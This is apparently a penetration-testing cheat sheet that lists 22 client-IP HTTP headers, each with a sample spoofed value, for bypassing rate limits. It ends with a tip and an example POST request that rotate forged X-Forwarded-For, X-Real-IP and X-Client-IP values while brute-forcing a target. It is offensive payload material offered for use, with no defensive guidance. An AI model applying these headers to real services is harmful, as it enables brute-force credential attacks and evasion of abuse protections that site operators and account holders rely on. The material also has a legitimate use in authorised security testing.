
---

### 🔑 Rate-limit bypass headers with examples

**1. `X-Forwarded-For`**
👉 Most common, often trusted for client IP.

```
X-Forwarded-For: 123.45.67.89
```

**2. `X-Forwarded`**
👉 Short variant.

```
X-Forwarded: 192.168.1.100
```

**3. `X-Forwarded-Host`**
👉 Sometimes controls hostname logging.

```
X-Forwarded-Host: evil.com
```

**4. `X-Forwarded-Server`**

```
X-Forwarded-Server: random.server
```

**5. `X-Originating-IP`**
👉 Common in email/webmail apps, sometimes used in auth logs.

```
X-Originating-IP: 10.20.30.40
```

**6. `X-Remote-IP`**

```
X-Remote-IP: 203.0.113.77
```

**7. `X-Remote-Addr`**

```
X-Remote-Addr: 45.67.89.101
```

**8. `X-Real-IP`**
👉 Nginx commonly sets this to preserve client IP.

```
X-Real-IP: 172.16.0.55
```

**9. `X-Client-IP`**

```
X-Client-IP: 54.23.12.98
```

**10. `X-Forwarded-Client-IP`**

```
X-Forwarded-Client-IP: 66.77.88.99
```

**11. `X-Cluster-Client-IP`**
👉 Seen in load balancers.

```
X-Cluster-Client-IP: 203.0.113.222
```

**12. `X-ProxyUser-IP`**

```
X-ProxyUser-IP: 192.0.2.44
```

**13. `Forwarded`**
👉 RFC 7239 format.

```
Forwarded: for=123.123.123.123
```

**14. `Forwarded-For`**

```
Forwarded-For: 11.22.33.44
```

**15. `True-Client-IP`**
👉 Used by Akamai, often trusted.

```
True-Client-IP: 77.88.99.11
```

**16. `CF-Connecting-IP`**
👉 Cloudflare forwards real client IP this way.

```
CF-Connecting-IP: 101.102.103.104
```

**17. `Fastly-Client-IP`**
👉 Used by Fastly CDN.

```
Fastly-Client-IP: 55.66.77.88
```

**18. `X-True-Client-IP`**

```
X-True-Client-IP: 23.45.67.89
```

**19. `X-Original-Forwarded-For`**

```
X-Original-Forwarded-For: 12.34.56.78
```

**20. `X-Forwarded-Proto`**
👉 Sometimes influences backend behavior (http/https).

```
X-Forwarded-Proto: https
```

**21. `X-Forwarded-Scheme`**

```
X-Forwarded-Scheme: http
```

**22. `X-Device-IP`**

```
X-Device-IP: 198.51.100.55
```

---

⚡️Pro Tip:
When brute-forcing, rotate **both headers and IPs** like this:

```http
POST /index.php HTTP/1.1
Host: target
X-Forwarded-For: 23.45.67.89
X-Real-IP: 77.88.99.11
X-Client-IP: 192.0.2.123
```

Some apps will pick *one* of these values to enforce rate limits.

---
